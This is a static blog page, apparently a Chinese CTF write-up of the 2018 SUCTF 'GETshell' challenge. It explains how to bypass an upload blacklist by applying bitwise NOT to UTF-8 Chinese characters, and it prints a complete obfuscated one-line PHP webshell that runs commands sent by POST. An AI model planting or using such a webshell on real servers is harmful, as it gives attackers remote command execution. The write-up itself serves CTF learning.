@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="访问题目 12345678if($contents&#x3D;file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&amp;#123;    $data&#x3D;substr($contents,5);    foreach ($black_char as $b) &amp;#123;        if (stripos($da">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018SUCTF GETshell--字符取反绕过正则">
+<meta property="og:url" content="https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/index.html">
+<meta property="og:site_name" content="Mzzd">
+<meta property="og:description" content="访问题目 12345678if($contents&#x3D;file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&amp;#123;    $data&#x3D;substr($contents,5);    foreach ($black_char as $b) &amp;#123;        if (stripos($da">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/1.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/2.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/3.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/4.png">
+<meta property="article:published_time" content="2020-06-01T02:53:42.000Z">
+<meta property="article:modified_time" content="2020-06-09T03:26:57.492Z">
+<meta property="article:author" content="作者">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2018SUCTF GETshell--字符取反绕过正则</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/05/29/windows%E6%89%B9%E5%A4%84%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&text=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&is_video=false&description=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2018SUCTF GETshell--字符取反绕过正则&body=Check out this article: https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&name=2018SUCTF GETshell--字符取反绕过正则&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&t=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2018SUCTF GETshell--字符取反绕过正则
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Mzzd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-01T02:53:42.000Z" itemprop="datePublished">2020-06-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>访问题目<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/1.png" alt="1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($contents&#x3D;file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class="line">    $data&#x3D;substr($contents,5);</span><br><span class="line">    foreach ($black_char as $b) &#123;</span><br><span class="line">        if (stripos($data, $b) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&quot;illegal char&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从第六位开始有black_char过滤<br>随便传一个文件用burp测试被过滤字符<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/2.png" alt="2"></p>
+<p>长度为681的都可以通过黑名单<br>考虑使用”异或”和”取反”绕过正则过滤<br>这里参考文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>发现<code>&lt;?=$_=(&#39;</code>被过滤了<br>这串字符是异或必须要有的字符，所以考虑另一种方法：取反<br>利用UTF-8编码的某个汉字，将其中某个字符取出来，比如‘和’{2} 的结果为 ‘\x8c’ ，取反为字母s。<br>本地php7运行截图<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/3.png" alt="3"></p>
+<p>这里还过滤了空格和换行符所以要把shell写在一行，而php语法代码只有一行的情况下&lt;?php后边要加空格，所以这里用短标签避免</p>
+<p>最终测试得到shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;$_&#x3D;[];$__.&#x3D;$_;$____&#x3D;$_&#x3D;&#x3D;$_;$___&#x3D;~茉[$____];$___.&#x3D;~内[$____];$___.&#x3D;~茉[$____];$___.&#x3D;~苏[$____];$___.&#x3D;~的[$____];$___.&#x3D;~咩[$____];$_____&#x3D;_;$_____.&#x3D;~课[$____];$_____.&#x3D;~尬[$____];$_____.&#x3D;~笔[$____];$_____.&#x3D;~端[$____];$__________&#x3D;$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>
+<p>此shell命令执行方式：<br>post提交a=(此处为要执行的命令)</p>
+<p>执行env即可得到flag<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/2018suctf/4.png" alt="4"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&text=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&is_video=false&description=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2018SUCTF GETshell--字符取反绕过正则&body=Check out this article: https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&title=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&name=2018SUCTF GETshell--字符取反绕过正则&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2020/06/01/2018SUCTF%20GETshell--%E5%AD%97%E7%AC%A6%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/&t=2018SUCTF GETshell--字符取反绕过正则" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    作者
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
